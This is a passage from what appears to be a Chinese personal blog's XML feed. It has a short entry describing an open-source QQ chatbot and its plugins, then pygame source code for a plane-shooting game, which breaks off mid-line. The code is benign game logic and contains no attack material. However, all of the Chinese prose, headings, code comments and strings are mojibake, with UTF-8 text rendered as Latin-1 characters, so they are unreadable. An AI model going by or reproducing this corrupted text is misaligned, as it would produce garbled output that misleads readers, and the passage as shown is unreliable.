title="ä¸ªäººqqæœºå™¨äºº(å·²ç»å¼€æº)"></a>ä¸ªäººqqæœºå™¨äºº(å·²ç»å¼€æº)</h2><p>å¼€æºåœ°å€:<a href="https://github.com/Lmg66/QQrobot" target="_blank" rel="noopener">https://github.com/Lmg66/QQrobot</a></p><p>å®ç°çš„åŠŸèƒ½</p><p> 1.å¤©æ°”ï¼Œé£Ÿç”¨æ–¹æ³•â€å°å®‰+å¤©æ°”â€ </p><pre><code>æ–‡ä»¶ç›®å½•ï¼šplugins/weather</code></pre><p> 2.å›¾çµå¯¹è¯ï¼Œé£Ÿç”¨æ–¹+ä½ æƒ³è¯´çš„è¯â€ </p><pre><code> plugins/tuling.py</code></pre><p> 3.ä¿¡æ¯çš„è·å–ï¼Œé£Ÿç”¨æ–¹æ³•â€å°å®‰+ç¢§è“èˆªçº¿â€è¿˜å¯ä»¥+çŸ¥ä¹+steam+æ–°ç•ª+<em>å¹´</em>æœˆæœ‰ä»€ä¹ˆæ–°ç•ª+å…ˆçŸ¥ç¤¾åŒº </p><pre><code> pluginsä¸‹çœ‹æ–‡ä»¶çš„å‘½ååŸºæœ¬éƒ½æ˜¯åŠŸèƒ½</code></pre><p> 4.æ¸¸æˆåŠŸèƒ½,é£Ÿç”¨æ–¹æ³•â€å°å®‰+è°æ˜¯å§åº•â€â€”-&gt;æµ‹è¯•ing  </p><p> 5.ä»¥å›¾æœç•ªï¼Œé£Ÿç”¨æ–¹æ³•â€å°å®‰+ä»¥å›¾æœç•ªâ€</p><pre><code>  plugins/anime_search_photo.py</code></pre><p> 6.éŸ³ä¹åŠŸèƒ½,é£Ÿç”¨æ–¹æ³•â€å°å®‰+æ¥é¦–â€â€”â€”&gt;æ­¤å¤„æœ‰bugä¸å»ºè®®é£Ÿç”¨ä¼šè®©å°å®‰å¡ä½ </p><pre><code> plugins/musice</code></pre><p> 7.æ—©å®‰ï¼Œåˆå®‰ï¼Œæ™šå®‰  </p><pre><code> plugins/one_talk</code></pre><p> è¿˜æœ‰éšè—åŠŸèƒ½å“¦ï¼Œä¸å¦¨è¾“å…¥â€å°å®‰+æ¥ä¸ªæ¶©å›¾â€è¯•è¯•æœ‰æƒŠå–œå“¦ï¼Œå˜»å˜»å˜»â€™)</p>]]></content>
      
      
      <categories>
          
          <category> qqæœºå™¨äºº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qqæœºå™¨äººçš„æ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonå°æ¸¸æˆ-æ°´æ–‡</title>
      <link href="/posts/5fc7.html"/>
      <url>/posts/5fc7.html</url>
      
        <content type="html"><![CDATA[<h4 id="è„šæœ¬ä¸ä¼šï¼Œå…¨éƒ½ç™½è´¹ã€‚æ‰€ä»¥å°±å»å­¦ä¹ äº†ç®€å•çš„pythonï¼Œç»“æœä¸æ…å­¦äº†pythonä¸­çš„pygameï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œæ²¡å•¥ç”¨å¦‚æœä¸åšæ¸¸æˆä¸ªäººè§‰å¾—æœ€å¥½åˆ«å­¦ï¼Œå­¦çˆ¬è™«å¥¹ä¸é¦™å—ï¼Ÿä¸è¿‡ä¹Ÿæœ‰ä¸€ç‚¹æ”¶è·ï¼Œæ‰“é£æœºå°æ¸¸æˆï¼Œæºç å¥‰ä¸Šï¼ˆæ³¨æ„ï¼šå®‰è£…pygameåº“å“¦ï¼ï¼ï¼ï¼‰"><a href="#è„šæœ¬ä¸ä¼šï¼Œå…¨éƒ½ç™½è´¹ã€‚æ‰€ä»¥å°±å»å­¦ä¹ äº†ç®€å•çš„pythonï¼Œç»“æœä¸æ…å­¦äº†pythonä¸­çš„pygameï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œæ²¡å•¥ç”¨å¦‚æœä¸åšæ¸¸æˆä¸ªäººè§‰å¾—æœ€å¥½åˆ«å­¦ï¼Œå­¦çˆ¬è™«å¥¹ä¸é¦™å—ï¼Ÿä¸è¿‡ä¹Ÿæœ‰ä¸€ç‚¹æ”¶è·ï¼Œæ‰“é£æœºå°æ¸¸æˆï¼Œæºç å¥‰ä¸Šï¼ˆæ³¨æ„ï¼šå®‰è£…pygameåº“å“¦ï¼ï¼ï¼ï¼‰" class="headerlink" title="è„šæœ¬ä¸ä¼šï¼Œå…¨éƒ½ç™½è´¹ã€‚æ‰€ä»¥å°±å»å­¦ä¹ äº†ç®€å•çš„pythonï¼Œç»“æœä¸æ…å­¦äº†pythonä¸­çš„pygameï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œæ²¡å•¥ç”¨å¦‚æœä¸åšæ¸¸æˆä¸ªäººè§‰å¾—æœ€å¥½åˆ«å­¦ï¼Œå­¦çˆ¬è™«å¥¹ä¸é¦™å—ï¼Ÿä¸è¿‡ä¹Ÿæœ‰ä¸€ç‚¹æ”¶è·ï¼Œæ‰“é£æœºå°æ¸¸æˆï¼Œæºç å¥‰ä¸Šï¼ˆæ³¨æ„ï¼šå®‰è£…pygameåº“å“¦ï¼ï¼ï¼ï¼‰"></a>è„šæœ¬ä¸ä¼šï¼Œå…¨éƒ½ç™½è´¹ã€‚æ‰€ä»¥å°±å»å­¦ä¹ äº†ç®€å•çš„pythonï¼Œç»“æœä¸æ…å­¦äº†pythonä¸­çš„pygameï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œæ²¡å•¥ç”¨å¦‚æœä¸åšæ¸¸æˆä¸ªäººè§‰å¾—æœ€å¥½åˆ«å­¦ï¼Œå­¦çˆ¬è™«å¥¹ä¸é¦™å—ï¼Ÿä¸è¿‡ä¹Ÿæœ‰ä¸€ç‚¹æ”¶è·ï¼Œæ‰“é£æœºå°æ¸¸æˆï¼Œæºç å¥‰ä¸Šï¼ˆæ³¨æ„ï¼šå®‰è£…pygameåº“å“¦ï¼ï¼ï¼ï¼‰</h4><h4 id="pythonå­¦ä¹ åœ°å€ï¼šhttps-www-bilibili-com-video-BV1ex411x7Em-from-search-amp-seid-16707064392510899029"><a href="#pythonå­¦ä¹ åœ°å€ï¼šhttps-www-bilibili-com-video-BV1ex411x7Em-from-search-amp-seid-16707064392510899029" class="headerlink" title="pythonå­¦ä¹ åœ°å€ï¼šhttps://www.bilibili.com/video/BV1ex411x7Em?from=search&amp;seid=16707064392510899029"></a>pythonå­¦ä¹ åœ°å€ï¼š<a href="https://www.bilibili.com/video/BV1ex411x7Em?from=search&amp;seid=16707064392510899029" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1ex411x7Em?from=search&amp;seid=16707064392510899029</a></h4><h4 id="æ–‡ä»¶å‘½åä¸ºplane-main-py"><a href="#æ–‡ä»¶å‘½åä¸ºplane-main-py" class="headerlink" title="æ–‡ä»¶å‘½åä¸ºplane_main.py"></a>æ–‡ä»¶å‘½åä¸ºplane_main.py</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pygame<span class="token keyword">from</span> plane_sprites <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">PlaneGame</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># </span><span class="token triple-quoted-string string">"""é£æœºå¤§æˆ˜ä¸»æ¸¸æˆ"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ¸¸æˆåˆå§‹åŒ–..."</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 1.åˆ›å»ºæ¸¸æˆçª—å£,å®½åº¦xå’Œé«˜åº¦y,å¸¸é‡SCREEN_RECT = pygame.Rect(0, 0, 480, 700)ï¼ŒSCREEN_RECT.size=(480,700)</span>        self<span class="token punctuation">.</span>screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>SCREEN_RECT<span class="token punctuation">.</span>size<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.åˆ›å»ºæ¸¸æˆçš„æ—¶é’Ÿ</span>        self<span class="token punctuation">.</span>clock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 3.è°ƒç”¨ç§æœ‰æ–¹æ³•ï¼Œç²¾çµå’Œç²¾çµç»„çš„åˆ›å»º</span>        self<span class="token punctuation">.</span>__create_sprites<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 4.è®¾ç½®å®šæ—¶æ—¶é—´ - åˆ›å»ºæ•Œæœº 1sï¼ŒCREATE_ENEMY_EVENTåˆ›å»ºæ•Œæœºé¢‘ç‡ï¼ŒHERO_FIRE_EVENTå‘å°„å­å¼¹é¢‘ç‡</span>        pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>set_timer<span class="token punctuation">(</span>CREATE_ENEMY_EVENT<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>        pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>set_timer<span class="token punctuation">(</span>HERO_FIRE_EVENT<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__create_sprites</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># åˆ›å»ºèƒŒæ™¯ç²¾çµå’Œç²¾çµç»„ï¼Œè°ƒç”¨plane_spritesçš„Background()ç±»</span>        bg1 <span class="token operator">=</span> Background<span class="token punctuation">(</span><span class="token punctuation">)</span>        bg2 <span class="token operator">=</span> Background<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>back_ground <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Group<span class="token punctuation">(</span>bg1<span class="token punctuation">,</span> bg2<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># åˆ›å»ºæ•Œæœºçš„ç²¾çµç»„</span>        self<span class="token punctuation">.</span>enemy_group <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Group<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># åˆ›å»ºè‹±é›„çš„ç²¾çµå’Œç²¾çµç»„</span>        self<span class="token punctuation">.</span>hero <span class="token operator">=</span> Hero<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hero_group <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Group<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hero<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">start_game</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ¸¸æˆå¼€å§‹..."</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 1.è®¾ç½®åˆ·æ–°å¸§ç‡</span>            self<span class="token punctuation">.</span>clock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>FRAME_PER_SEC<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 2.äº‹ä»¶ç›‘å¬</span>            self<span class="token punctuation">.</span>__event_handler<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 3.ç¢°æ’æ£€æµ‹</span>            self<span class="token punctuation">.</span>__check_collide<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 4.æ›´æ–°/ç»˜åˆ¶ç²¾çµç»„</span>            self<span class="token punctuation">.</span>__update_sprites<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 5.æ›´æ–°åˆ·æ–°æ˜¾ç¤º</span>            pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__event_handler</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># åˆ¤æ–­æ˜¯å¦ç‚¹Ã—é€€å‡ºæ¸¸æˆ</span>            <span class="token keyword">if</span> event<span class="token punctuation">.</span>type <span class="token operator">==</span> pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>                PlaneGame<span class="token punctuation">.</span>__game_over<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> event<span class="token punctuation">.</span>type <span class="token operator">==</span> CREATE_ENEMY_EVENT<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ•Œæœºå‡ºåœº..."</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 1.åˆ›å»ºæ•Œæœºç²¾çµ</span>                enemy <span class="token operator">=</span> Enemy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 2.å°†æ•Œæœºç²¾çµæ·»åŠ åˆ°ç²¾çµç»„</span>                self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">.</span>add<span class="token punctuation">(</span>enemy<span class="token punctuation">)</span>            <span class="token keyword">elif</span> event<span class="token punctuation">.</span>type <span class="token operator">==</span> HERO_FIRE_EVENT<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>fire<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># ä½¿ç”¨é”®ç›˜æä¾›çš„æ–¹æ³•è·å–é”®ç›˜æŒ‰é”®</span>        keys_pressed <span class="token operator">=</span> pygame<span class="token punctuation">.</span>key<span class="token punctuation">.</span>get_pressed<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># åˆ¤æ–­å…ƒç»„ä¸­å¯¹åº”çš„æŒ‰é”®ç´¢å¼•å€¼ 1</span>        <span class="token keyword">if</span> keys_pressed<span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token number">3</span>        <span class="token keyword">elif</span> keys_pressed<span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">__check_collide</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.å­å¼¹æ‘§æ¯æ•Œæœºï¼Œå­å¼¹å’Œæ•Œæœºéƒ½é”€æ¯</span>        pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>groupcollide<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>bullets<span class="token punctuation">,</span> self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.æ•Œæœºæ‘§æ¯è‹±é›„</span>        enemies <span class="token operator">=</span> pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>spritecollide<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hero<span class="token punctuation">,</span> self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 3.åˆ¤æ–­åˆ—è¡¨æ˜¯å¦æœ‰å†…å®¹ï¼Œæœ‰å†…å®¹è‹±é›„é£æœºæ‘§æ¯</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>enemies<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># è®©è‹±é›„ç‰ºç‰²</span>            self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># ç»“æŸæ¸¸æˆ</span>            PlaneGame<span class="token punctuation">.</span>__game_over<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__update_sprites</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># èƒŒæ™¯ç²¾çµç»„æ›´æ–°</span>        self<span class="token punctuation">.</span>back_ground<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>back_ground<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>self<span class="token punctuation">.</span>screen<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># æ•Œæœºç²¾çµç»„æ›´æ–°</span>        self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>enemy_group<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>self<span class="token punctuation">.</span>screen<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># è‹±é›„ç²¾çµç»„æ›´æ–°</span>        self<span class="token punctuation">.</span>hero_group<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hero_group<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>self<span class="token punctuation">.</span>screen<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># å­å¼¹ç²¾çµç»„æ›´æ–°</span>        self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>bullets<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hero<span class="token punctuation">.</span>bullets<span class="token punctuation">.</span>draw<span class="token punctuation">(</span>self<span class="token punctuation">.</span>screen<span class="token punctuation">)</span>    @staticmethod    <span class="token keyword">def</span> <span class="token function">__game_over</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ¸¸æˆç»“æŸ..."</span><span class="token punctuation">)</span>        pygame<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># åˆ›å»ºæ¸¸æˆå¯¹è±¡</span>    game <span class="token operator">=</span> PlaneGame<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># å¯åŠ¨æ¸¸æˆ</span>    game<span class="token punctuation">.</span>start_game<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="æ–‡ä»¶å‘½åä¸ºplane-sprites-py"><a href="#æ–‡ä»¶å‘½åä¸ºplane-sprites-py" class="headerlink" title="æ–‡ä»¶å‘½åä¸ºplane_sprites.py"></a>æ–‡ä»¶å‘½åä¸ºplane_sprites.py</h4><pre class=" language-python"><code class="language-python"> <span class="token keyword">import</span> pygame<span class="token keyword">import</span> random<span class="token comment" spellcheck="true"># å®šä¹‰å±å¹•å¤§å°çš„å¸¸é‡</span>SCREEN_RECT <span class="token operator">=</span> pygame<span class="token punctuation">.</span>Rect<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">480</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># åˆ·æ–°çš„å¸§ç‡ï¼Œç”»é¢å¤šå°‘æ¯«ç§’åˆ·æ–°ä¸€æ¬¡</span>FRAME_PER_SEC <span class="token operator">=</span> <span class="token number">60</span><span class="token comment" spellcheck="true"># åˆ›å»ºæ•Œæœºçš„å®šæ—¶å™¨å¸¸é‡</span>CREATE_ENEMY_EVENT <span class="token operator">=</span> pygame<span class="token punctuation">.</span>USEREVENT<span class="token comment" spellcheck="true"># è‹±é›„å‘å°„å­å¼¹äº‹ä»¶å®šæ—¶å™¨å¸¸é‡</span>HERO_FIRE_EVENT <span class="token operator">=</span> pygame<span class="token punctuation">.</span>USEREVENT <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">class</span> <span class="token class-name">GameSprite</span><span class="token punctuation">(</span>pygame<span class="token punctuation">.</span>sprite<span class="token punctuation">.</span>Sprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""é£æœºå¤§æˆ˜æ¸¸æˆç²¾çµ"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> image_name<span class="token punctuation">,</span> speed<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># è°ƒç”¨çˆ¶ç±»çš„åˆå§‹åŒ–æ–¹æ³•</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># å®šä¹‰å¯¹è±¡çš„å±æ€§,å›¾åƒã€ä½ç½®ã€é€Ÿåº¦</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span>image_name<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>rect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> speed    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># åœ¨å±å¹•çš„å‚ç›´æ–¹å‘ä¸Šç§»åŠ¨</span>        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">+=</span> self<span class="token punctuation">.</span>speed<span class="token keyword">class</span> <span class="token class-name">Background</span><span class="token punctuation">(</span>GameSprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""æ¸¸æˆèƒŒæ™¯ç²¾çµ"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> is_alt<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1. è°ƒç”¨çˆ¶ç±»æ–¹æ³•å®ç°ç²¾çµçš„åˆ›å»º</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"./images/background.png"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2. åˆ¤æ–­æ˜¯å¦æ˜¯äº¤æ›¿å›¾åƒï¼Œå¦‚æœæ˜¯ï¼Œéœ€è¦è®¾ç½®åˆå§‹ä½ç½®</span>        <span class="token keyword">if</span> is_alt<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>height    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•å®ç°å‚ç›´ç§»åŠ¨</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.åˆ¤æ–­æ˜¯å¦ç§»é™¤å±å¹•ï¼Œå¦‚æœç§»é™¤äº†ï¼Œå†å°†å›¾ç‰‡è®¾ç½®åˆ°å±å¹•çš„ä¸Šæ–¹</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">>=</span> SCREEN_RECT<span class="token punctuation">.</span>height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>height<span class="token keyword">class</span> <span class="token class-name">Enemy</span><span class="token punctuation">(</span>GameSprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""æ•Œæœºç²¾çµ"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œåˆ›å»ºæ•Œæœºç²¾çµï¼ŒåŒæ—¶åˆ¶å®šæ•Œæœºå›¾ç‰‡</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"./images/enemy1.png"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.åˆ¶å®šæ•Œæœºçš„åˆå§‹éšæœºé€Ÿåº¦</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 3.åˆ¶å®šæ•Œæœºçš„åˆå§‹éšæœºä½ç½®</span>        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>bottom <span class="token operator">=</span> <span class="token number">0</span>        max_x <span class="token operator">=</span> SCREEN_RECT<span class="token punctuation">.</span>width <span class="token operator">-</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>width        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>x <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> max_x<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œä¿æŒå‚ç›´æ–¹å‘çš„é£è¡Œ</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.åˆ¤æ–­æ˜¯å¦é£å‡ºå±å¹•ï¼Œå¦‚æœæ˜¯ï¼Œéœ€è¦ä»ç²¾çµç»„åˆ é™¤æ•Œæœº</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>y <span class="token operator">>=</span> SCREEN_RECT<span class="token punctuation">.</span>height<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é£å‡ºå±å¹•ï¼Œéœ€è¦ä»ç²¾çµç»„åˆ é™¤..."</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># killæ–¹æ³•å¯ä»¥å°†ç²¾çµä»æ‰€æœ‰ç²¾çµç»„ä¸­ç§»é™¤ï¼Œç²¾çµç»„å°±ä¼šè¢«è‡ªåŠ¨é”€æ¯</span>            self<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ•ŒæœºæŒ‚äº†... %s"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>rect<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span>GameSprite<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""è‹±é›„ç²¾çµ"""</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 1.è°ƒç”¨çˆ¶ç±»æ–¹æ³•ï¼Œè®¾ç½®image &amp; speed</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token string">"./images/me1.png"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 2.è®¾ç½®è‹±é›„çš„åˆå§‹ä½ç½®</span>        self<span class="token punctuation">.</span>rect<span class="token punctuation">.</span>centerx <span class="token operator">=</span> 